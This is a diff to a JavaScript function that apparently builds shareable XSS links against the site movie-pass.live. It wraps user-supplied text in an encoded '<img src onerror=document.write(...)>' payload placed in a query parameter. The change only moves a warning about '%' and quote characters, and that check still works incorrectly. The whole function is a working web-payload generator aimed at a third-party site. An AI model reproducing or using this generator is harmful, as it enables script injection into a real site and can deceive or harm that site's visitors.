@@ -24,6 +24,9 @@ function generate(binput,cidHide) {
             cidHideModified = "";
         }
     convert(binput);
+    if (inputModified.includes("%" || '"')) {
+        alert("Including '%' or '\"' is likely to break the tool. It will still generate, but be careful.");
+    }
     var baseURL = "https://movie-pass.live/su/?s=xss&cid=" + cidHideModified + "&q=%3Cimg+src+onerror%3D%22document.write(`" + inputModified + "`)%22%3E%3C%2Fimg%3E&a=3&img=";
         if (baseURL.length > 2000) {
             if ("https://movie-pass.live/su/?s=xss&cid=&q=%3Cimg+src+onerror%3D%22document.write(`" + inputModified + "`)%22%3E%3C%2Fimg%3E&a=3&img=".length < 2000) { //checks length of baseURL without cidHide on.
@@ -34,10 +37,6 @@ function generate(binput,cidHide) {
             }
         }
         else {
-            check_for_breakers = baseURL.includes("%" || '"');
-            if (check_for_breakers = "true") {
-                alert("Including '%' or '\"' is likely to break the tool. It will still generate, but be careful.");
-            }
             console.log("URL generated!\nGenerated url: \n\n " + baseURL);
             document.getElementById("OUTPUT").href = baseURL;
         }
